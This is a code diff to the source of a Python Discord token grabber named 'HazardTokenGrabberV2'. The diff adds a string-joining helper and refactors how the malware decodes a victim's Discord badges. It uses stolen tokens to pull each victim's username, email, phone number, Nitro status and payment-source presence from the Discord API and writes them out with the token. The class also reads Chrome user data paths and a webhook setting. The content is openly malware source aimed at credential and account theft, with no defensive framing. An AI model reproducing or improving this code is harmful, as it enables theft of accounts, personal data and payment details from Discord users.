@@ -156,11 +156,27 @@ class Functions(object):
     def fetch_conf(e: str) -> str or bool | None:
         return __config__.get(e)
 
+    @staticmethod
+    def fancy_join(iterable: list) -> str:
+        if len(iterable) < 1:
+            return ""
+        else:
+            out = str(iterable[0])
+            if len(iterable) > 1:
+                for i, entry in enumerate(iterable[1:]):
+                    if len(iterable) - 1 > 1:
+                        out += ', ' if len(iterable) - (i + 1) > 1 else ', and '
+                        out += str(entry)
+                    else:
+                        out += f' and {entry}'
+            return out
+
 
 class HazardTokenGrabberV2(Functions):
     def __init__(self):
         self.webhook = self.fetch_conf('webhook')
         self.discordApi = "https://discord.com/api/v9/users/@me"
+        self.flag_info = "https://raw.githubusercontent.com/LewisTehMinerz/discord-flags/master/flags.json"
         self.appdata = os.getenv("localappdata")
         self.roaming = os.getenv("appdata")
         self.chrome_user_data = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
@@ -501,39 +517,32 @@ class HazardTokenGrabberV2(Functions):
         for token in self.tokens:
             j = httpx.get(self.discordApi, headers=self.get_headers(token)).json()
             user = j.get('username') + '#' + str(j.get("discriminator"))
-
-            badges = ""
             flags = j['flags']
-            if (flags == 1):
-                badges += "Staff, "
-            if (flags == 2):
-                badges += "Partner, "
-            if (flags == 4):
-                badges += "Hypesquad Event, "
-            if (flags == 8):
-                badges += "Green Bughunter, "
-            if (flags == 64):
-                badges += "Hypesquad Bravery, "
-            if (flags == 128):
-                badges += "HypeSquad Brillance, "
-            if (flags == 256):
-                badges += "HypeSquad Balance, "
-            if (flags == 512):
-                badges += "Early Supporter, "
-            if (flags == 16384):
-                badges += "Gold BugHunter, "
-            if (flags == 131072):
-                badges += "Verified Bot Developer, "
-            if (badges == ""):
-                badges = "None"
+
+            # JSON of all discord flags
+            flags_json = httpx.get(self.flag_info).json()
+
+            # Order the flags from highest shift to lowest
+            flags_ordered = list(flags_json.keys())
+            flags_ordered.sort(key=lambda x: flags_json[x]['shift'], reverse=True)
+
+            # Check if user has said flag/badge
+            badges = []
+            for flag in flags_ordered:
+                if (flags >> flags_json[flag]['shift']) == 1:
+                    badges.append(str(flag))
+                    flags -= int(1 << flags_json[flag]['shift'])
+
+            # Format to string and to look nicer
+            formatted_badges = self.fancy_join([badge.replace('_', ' ').title() for badge in badges])
+            badges = formatted_badges if formatted_badges != '' else "User has no badges"
 
             email = j.get("email")
             phone = j.get("phone") if j.get("phone") else "No Phone Number attached"
             nitro_data = httpx.get(self.discordApi + '/billing/subscriptions', headers=self.get_headers(token)).json()
-            has_nitro = False
             has_nitro = bool(len(nitro_data) > 0)
             billing = bool(len(json.loads(httpx.get(self.discordApi + "/billing/payment-sources", headers=self.get_headers(token)).text)) > 0)
-            f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
+            f.write(f"{' ' * 17}{user}\n{'-' * 50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n")
         f.close()
 
     def grabMinecraftCache(self):
